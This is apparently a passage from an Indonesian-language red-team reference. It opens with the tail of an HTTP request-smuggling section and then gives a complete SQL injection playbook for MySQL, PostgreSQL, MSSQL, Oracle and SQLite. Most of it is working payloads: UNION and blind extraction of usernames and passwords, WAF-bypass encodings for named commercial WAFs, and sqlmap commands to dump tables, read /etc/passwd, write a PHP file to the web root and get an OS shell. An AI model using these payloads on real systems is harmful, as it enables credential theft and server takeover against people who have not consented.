12. **H2.CL di Envoy ≥1.27** sudah ditutup (CVE-2023-25194 fix, `--reject-invalid-h2-transfer-encoding` default on). Cek versi via `curl -sI --http2 https://t.local | grep -i server` → cari `envoy`.

## 9. Cek Cepat Versi Target

```bash
# nginx
curl -sI https://t.local/ | grep -iE '^server|^x-'
# Envoy
nghttp -nv https://t.local/ 2>&1 | grep -i 'envoy\|server'
# Backend Go
curl -sI https://t.local/error-trigger-path | grep -i '^server: Go'
# Chrome/Firefox build
navigator.userAgent  # via halaman uji milik red team
```

## 10. Raw Socket Canonical (untuk reproduksi lab)


## sqli

# sqli — web

# SQL Injection End-to-End — Referensi Red Team

## 1. Klasifikasi & Titik Deteksi

| Vektor | Kiriman | Respons pembeda | Catatan |
|---|---|---|---|
| Error-based | `'` / `"` / `\` | `You have an error in your SQL syntax...` (MySQL), `syntax error at or near` (PG), `Unclosed quotation mark` (MSSQL), `ORA-00933` (Oracle), `SQLite3::prepare` (SQLite) | Paling cepat, sering dimatikan `display_errors` di prod |
| Boolean | `' AND 1=1-- -` vs `' AND 1=2-- -` | Body/status/length berbeda | Pakai `-- -` (MySQL trailing whitespace), `--` (PG), `/*` di MSSQL |
| Time | `' OR SLEEP(5)-- -` (MySQL), `;SELECT pg_sleep(5)--` (PG), `' WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND 1=dbms_pipe.receive_message('a',5)--` (Oracle), `' AND 1=randomblob(1000000000)--` (SQLite) | Δ latency ≥5s | Baseline dulu 3x, ukur jitter |
| Stacked | `'; DROP TABLE x-- -` | — | Hanya MSSQL & PG (multi-statement); MySQL `mysqli_query` mati untuk ini |
| OOB | `'; SELECT ... INTO OUTFILE` (MySQL), `xp_dirtree` (MSSQL), `UTL_HTTP` (Oracle) | DNS callback | Bypass blind murni |

Cek driver/ORM secara kausal: parameter `?id[]=1` (PHP array) sering bikin `mysqli` error tapi tidak injeksi; `id=1'` di Laravel → 500 tanpa pesan SQL = kemungkinan prepared statement.

---

## 2. Fingerprint DBMS via Error/Payload

| DBMS | Payload probe | Output khas |
|---|---|---|
| MySQL ≥5.7 | `' AND @@version-- -` / `' AND (SELECT 1 FROM (SELECT SLEEP(0))x)-- -` | `8.0.36-0ubuntu0.22.04.1` |
| PostgreSQL ≥9.6 | `' AND version()-- -` | `PostgreSQL 16.2 on x86_64-pc-linux-gnu` |
| MSSQL 2019/2022 | `' AND @@VERSION-- -` | `Microsoft SQL Server 2022 (RTM-CU14) ... Windows Server 2022` |
| Oracle 19c/23ai | `' AND banner FROM v$version-- -` | `Oracle Database 19c Enterprise Edition` |
| SQLite 3.x | `' AND sqlite_version()-- -` | `3.45.1` |

Untuk bedakan **MySQL vs MariaDB**: `@@version_comment` → `MariaDB` vs `MySQL Community Server`.

---

## 3. UNION Extraction per DBMS

**Aturan**: jumlah kolom & tipe harus cocok. Cek kolom dengan `ORDER BY N` incremental, atau langsung `UNION SELECT NULL,NULL,...`.

### 3.1 Cari jumlah kolom (universal)
```
' ORDER BY 1-- -
' ORDER BY 5-- -          # error di N = jumlah kolom+1
' UNION SELECT NULL-- -   # naikkan NULL sampai tidak error
' UNION SELECT 1,'2',3-- -  # tipe probe per posisi
```

### 3.2 MySQL — dump bertahap
```
' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -
' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='app'-- -
' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='app' AND table_name='users'-- -
' UNION SELECT 1,2,GROUP_CONCAT(CONCAT(username,0x3a,password) SEPARATOR 0x0a) FROM app.users-- -
```
`GROUP_CONCAT` default limit `group_concat_max_len=1024` — tambah `SET SESSION group_concat_max_len=1000000` via stacked (jarang), atau chunk `LIMIT 0,50`, `LIMIT 50,50`.

### 3.3 PostgreSQL
```
' UNION SELECT 1,2,string_agg(schemaname,',') FROM pg_tables-- -
' UNION SELECT 1,2,string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'-- -
' UNION SELECT 1,2,string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,2,string_agg(username||':'||password,chr(10)) FROM users-- -
```
PG ≥9.0 `string_agg`; kalau versi tua pakai `array_to_string(array_agg(...),',')`.

### 3.4 MSSQL
```
' UNION SELECT 1,2,STRING_AGG(name,',') FROM sys.databases-- -                 -- 2017+
' UNION SELECT 1,2,STRING_AGG(table_name,',') FROM information_schema.tables-- -
' UNION SELECT 1,2,STRING_AGG(CONCAT(username,':',password),CHAR(10)) FROM users-- -
```
MSSQL pre-2017: `FOR XML PATH('')`.

### 3.5 Oracle
```
' UNION SELECT 1,2,column_value FROM TABLE(sys.odcivarchar2list((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY 1) FROM user_tables)))-- -
' UNION SELECT 1,2,LISTAGG(username||':'||password,CHR(10)) WITHIN GROUP (ORDER BY 1) FROM users-- -
```
`FROM dual` wajib untuk literal: `' UNION SELECT 1,'x',3 FROM dual--`.

### 3.6 SQLite
```
' UNION SELECT 1,2,group_concat(name) FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1,2,group_concat(sql) FROM sqlite_master WHERE name='users'-- -
' UNION SELECT 1,2,group_concat(username||':'||password) FROM users-- -
```
Tidak ada `information_schema` — pakai `sqlite_master` / `pragma_table_info('users')`.

---

## 4. Blind Boolean & Time-Based (payload persis)

### 4.1 MySQL ≥5.0
**Boolean** — karakter-per-karakter:
```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
```
**Time**:
```
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0)-- -
' AND IF((SELECT COUNT(*) FROM users)>10,SLEEP(3),0)-- -
' OR SLEEP(3)-- -                                 # tanpa IF
```
Bypass `SLEEP` dimatikan → `BENCHMARK(5000000,MD5(1))`.

### 4.2 PostgreSQL
**Boolean**:
```
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users LIMIT 1)>64-- -
```
**Time**:
```
'; SELECT CASE WHEN (SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
```
Stacked diperlukan; kalau `;` mati, pakai:
```
' AND (SELECT 1 FROM pg_sleep(3)) IS NULL-- -
```

### 4.3 MSSQL
**Boolean** — `--` tidak butuh trailing space:
```
' AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>64--
```
**Time**:
```
'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:3'--
' AND 1=CASE WHEN (SELECT COUNT(*) FROM users)>10 THEN 1 ELSE 0 END; WAITFOR DELAY '0:0:3'--
```
MSSQL di web kadang `WAITFOR` diblok connection pooler → cek tidak ada `Execution Timeout` (default 30s di ASP.NET).

### 4.4 Oracle
**Boolean**:
```
' AND SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1)='a'-- -
```
**Time**:
```
' AND 1=CASE WHEN (SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1)='a') THEN dbms_pipe.receive_message('x',3) ELSE 0 END-- -
```
Butuh privilege `EXECUTE` pada `dbms_pipe` (default PUBLIC, jarang dicabut).

### 4.5 SQLite
**Boolean**:
```
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```
**Time** (tidak ada SLEEP):
```
' AND 1=randomblob(300000000)-- -                  # heuristik delay; kalibrasi di target
' AND 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT 1)=1 AND 1=randomblob(300000000))-- -
```
`randomblob(N)` dengan N besar → jitter. Kalibrasi N vs baseline latency (umumnya 100–500 juta byte).

---

## 5. WAF-Safe Encoding

| WAF yang umum ditemui | Bypass | Contoh |
|---|---|---|
| ModSecurity CRS 4.x | Case + comment split | `'/*!50000UNION*//*!50000SELECT*/1,2,3-- -` |
| Cloudflare WAF (2024) | Inline comment + `%0a` | `'%0aUNION%0aSELECT%0a1,2,3--%0a-` |
| AWS WAF managed | HTTP/2 lowercase header smuggling + `%09` | `'%09AND%09SLEEP(3)%09--%09-` |
| Imperva | Unicode full-width di string context | `' AND 1=1 AND 'a'='a` |
| Nginx 1.25 `ngx_http_rewrite` block | URL-encode keyword | `%55%4e%49%4f%4e` = `UNION` |

Teknik encoding:
```
UNION  → %55NION, /*!UNION*/, %U%N%I%O%N (stacked decode pada driver tertentu)
SPACE  → %09, %0a, %0c, /**/, +
-- -   → --%20, #, /* */, %23 (MSSQL: --%0a)
SELECT → %53ELECT, /*!50000SELECT*/
```
Body JSON-encode: `{"id":"1' OR 1=1-- -"}` → encoder ganda `%27` untuk endpoint yang decode sekali di ORM.

**sqlmap tamper chain** untuk CRS:
```
--tamper=space2comment,between,randomcase,charencode
```

---

## 6. sqlmap — Flag Penting

```bash
# Fingerprint + crawl downstream
sqlmap -u "https://t/app?id=1" --batch --level=5 --risk=3 --dbms=mysql \
       --technique=BEUST --threads=10 --random-agent --flush-session

# Enum
sqlmap -u "..." --dbs
sqlmap -u "..." -D app --tables
sqlmap -u "..." -D app -T users --columns
sqlmap -u "..." -D app -T users -C username,password --dump --dump-format=csv

# POST JSON body
sqlmap -u "https://t/api" --data='{"id":"1"}' \
       --headers="Content-Type: application/json" --dbms=postgresql

# Cookie / header injection
sqlmap -u "https://t/" --cookie="sess=abc; uid=1*" --level=3

# Bypass WAF
--tamper=space2comment,between,randomcase,charencode --delay=0.5 --randomize

# OS-level (MSSQL/MySQL)
--os-shell              # butuh stacked / INTO OUTFILE / xp_cmdshell
--os-pwn                # Metasploit tunneling via UDF
--os-cmd="whoami"

# File baca/tulis
--file-read="/etc/passwd"
--file-write="/tmp/x.php" --file-dest="/var/www/html/x.php"
--batch --file-read="C:/Windows/win.ini"

# Techniques
--technique=U           # UNION only (paling cepat)
--technique=T           # time-based
--technique=B           # boolean
--technique=E           # error
--technique=S           # stacked
--technique=Q           # inline query

# Tuning
--level=5 --risk=3 --threads=20 --time-sec=3 --dump-all --no-cast
--tamper=versionedkeywords    # MySQL >=5.1.13, /*!50000...*/
```
**Fine-tune blind latin1**: `--charset=ascii --hex` (dump via hex, hindari encoding korup). MSSQL: `--hex` + `--no-escape`.

**File write constraints**:
- MySQL: `secure_file_priv` harus `''` atau path `/var/www/html`; user `FILE` priv; `INTO OUTFILE` gagal jika file ada.
- PG: `COPY ... TO PROGRAM` butuh superuser atau `pg_write_server_files`. `pg_read_file` serupa.
- MSSQL: `xp_cmdshell` butuh `sysadmin` atau `CONTROL SERVER`; OLE `sp_OACreate` alternatif.
- Oracle: `UTL_FILE` butuh `CREATE ANY DIRECTORY`; `BLOB` via `BFILE`.

---

## 7. SQLi di Konteks Non-Klasik

### 7.1 ORDER BY — tidak bisa UNION/WHERE
`ORDER BY` tidak menerima subquery bernilai tabel, tapi bisa ekspresi scalar:
```
MySQL:    ?sort=(SELECT SLEEP(5))       # time
          ?sort=IF(1=1,id,title)         # boolean via urutan
          ?sort=(SELECT IF(SUBSTR(password,1,1)='a',id,title) FROM users LIMIT 1)
PG:       ?sort=CASE WHEN (SELECT ...)>0 THEN id ELSE title END
MSSQL:    ?sort=CASE WHEN (SELECT TOP 1 ...)='a' THEN id ELSE title END
```
Sering dikombinasi `LIMIT`/`OFFSET`:
```
?sort=id DESC LIMIT 1 OFFSET (SELECT ...)   # error-based via LIMIT offset
```

### 7.2 JSON path (MySQL 5.7+/PG 12+/MSSQL 2016+)
MySQL:
```
?filter={"a":"1' OR JSON_EXTRACT((SELECT password FROM users LIMIT 1),'$')='x'-- -"}
```
Injeksi via `JSON_UNQUOTE`:
```
id=1 AND JSON_UNQUOTE(JSON_EXTRACT((SELECT password FROM users LIMIT 1),'$'))='a'
```
PG `jsonb`: `id=1 AND (SELECT password FROM users LIMIT 1)::jsonb ? 'a'`.

### 7.3 LIMIT / OFFSET (integer injection)
```
MySQL:    ?page=1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,(SELECT password FROM users LIMIT 1))),1)
          ?limit=1 UNION SELECT 1,2,3         # jika LIMIT disambung langsung
PG:       ?limit=1;SELECT pg_sleep(5)--
MSSQL:    ?limit=1;WAITFOR DELAY '0:0:5'--
```
MySQL `PROCEDURE ANALYSE` sudah dihapus di 8.0.30 — fallback `EXTRACTVALUE`/`UPDATEXML` error-based:
```
?page=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))
```

---

## 8. Query Dump Bertahap (cheat sheet)

```
# 1. Berapa DB?
-- MySQL
' UNION SELECT 1,2,COUNT(*) FROM information_schema.schemata-- -
-- PG
' UNION SELECT 1,2,COUNT(*) FROM pg_database-- -
-- MSSQL
' UNION SELECT 1,2,COUNT(*) FROM sys.databases-- -
-- Oracle
' UNION SELECT 1,2,COUNT(*) FROM v$database-- -
-- SQLite (hanya satu DB; langsung ke tabel)
' UNION SELECT 1,2,COUNT(*) FROM sqlite_master WHERE type='table'-- -

# 2. List DB
MySQL:   SELECT schema_name FROM information_schema.schemata LIMIT 0,10
PG:      SELECT datname FROM pg_database LIMIT 10
MSSQL:   SELECT name FROM sys.databases
Oracle:  SELECT name FROM v$database  (SID/DB name)
SQLite:  (skip)

# 3. List tabel
MySQL/PG/MSSQL: information_schema.tables WHERE table_schema='app'
Oracle:          user_tables / all_tables
SQLite:          sqlite_master WHERE type='table'

# 4. List kolom
information_schema.columns WHERE table_schema='app' AND table_name='users'
Oracle: user_tab_columns WHERE table_name='USERS'
SQLite: pragma_table_info('users')

# 5. Dump row (chunked 0,50 50,50 ...)
MySQL : SELECT CONCAT(username,0x3a,password) FROM app.users LIMIT 0,50
PG    : SELECT username||':'||password FROM users LIMIT 50 OFFSET 0
MSSQL : SELECT TOP 50 username+':'+password FROM users ORDER BY id
Oracle: SELECT username||':'||password FROM (SELECT ... ORDER BY id) WHERE ROWNUM<=50
SQLite: SELECT username||':'||password FROM users LIMIT 50 OFFSET 0
```

Kolom hash (`users.password`) langsung di-extract; untuk bcrypt `$2y$` simpan raw — jangan lupa `--hex` di sqlmap agar tidak korup di charset non-UTF8.

---

## 9. Jebakan Operasional (yang bikin gagal di lapangan)

| # | Jebakan | Gejala | Mitigasi |
|---|---|---|---|
| 1 | Connection pooler (PgBouncer transaction mode, RDS Proxy) memutus stacked statement | Time-based `;SELECT pg_sleep` hang/timeout | Pakai `CASE WHEN ... THEN pg_sleep` non-stacked |
| 2 | `SLEEP()` di MySQL dibatasi `max_execution_time` atau proxy (ProxySQL `max_latency`) | Δ<0.5s | Turunkan ke 1–2s, ukur baseline 3x |
| 3 | `secure_file_priv` di MySQL 8.0.36 (`/var/lib/mysql-files`) | `INTO OUTFILE` error 1290 | Cek `@@secure_file_priv` dulu; fallback `LOAD_FILE` |
| 4 | `display_errors` mati, error log ke file | Tidak ada pesan SQL | Boolean/time-based; `sqlmap --technique=BT` |
| 5 | WAF rate-limit (Cloudflare 100 req/min free) | 429 mid-dump | `--delay=0.5 --threads=1 --safe-url=... --safe-freq=10` |
| 6 | Charset mismatch (latin1 vs utf8mb4, MSSQL nvarchar) | Dump korup `?` | `--hex --no-cast --charset=ascii` |
| 7 | JSON endpoint — body di-decode dua kali (framework `json_decode` + ORM cast) | Payload `'` jadi `\'` lalu hilang | Double-encode `%2527`, atau kirim raw lewat `--data` tanpa escape |
| 8 | MSSQL `WAITFOR DELAY` di IIS + ASP.NET `CommandTimeout=30` | Query timeout → 500, bukan delay | Cek header `X-AspNet-Version`; batasi delay 2s |
| 9 | Oracle `dbms_pipe` privilege dicabut (hardened 19c STIG) | Time gagal senyap | Fallback `DBMS_LOCK.SLEEP` (butuh EXECUTE) atau `HEAVY` query |
| 10 | PostgreSQL di Supabase/Neon managed connection pooler (pgbouncer) — `pg_sleep` jalan tapi dump via `information_schema` kena statement timeout 3s | Dump berhenti di chunk 2 | `--chunk=20 --time-sec=2` |
| 11 | SQLite `randomblob` di-disallow via custom build (mobile embedded) | Tidak delay | Gunakan `LIKE`-based over `sqlite_master` + `length()` diff |
| 12 | Payload `-- -` di MySQL kalau ada trailing `)` di query (`WHERE id=('1')`) | `1=1-- -` tidak menutup `)` | Prediksi query: `1')-- -`, `1'))-- -`, atau `1' OR '1'='1` tanpa komentar |
| 13 | PANGGILAN `sqlmap` ke endpoint butuh `Origin`/`Referer` CSRF | 403 mid-session | `--headers="Origin: https://t\nReferer: https://t/"` |
| 14 | Proxy TLS pinning di mobile app (Android 14) — tidak bisa lewat Burp tanpa Frida | Tidak ada traffic | `objection` / `frida-server` + unpinning script |
| 15 | Endpoint reset session token pada tiap request (rotating cookie) | sqlmap 401 loop | `--safe-url`, `--safe-freq`, atau `--eval` untuk refresh token |

**Verifikasi kausal terakhir**: sebelum eksploitasi destruktif (`--sql-shell`, `--os-shell`), jalankan `SELECT 1` via kanal sama pada target rehearsal — kalau 1 pun tidak keluar, bedakan (a) payload diblok WAF upstream, (b) query di-cache CDN (nginx 1.25 `proxy_cache`), (c) load balancer menyeimbangkan ke replica read-only yang querynya identik.
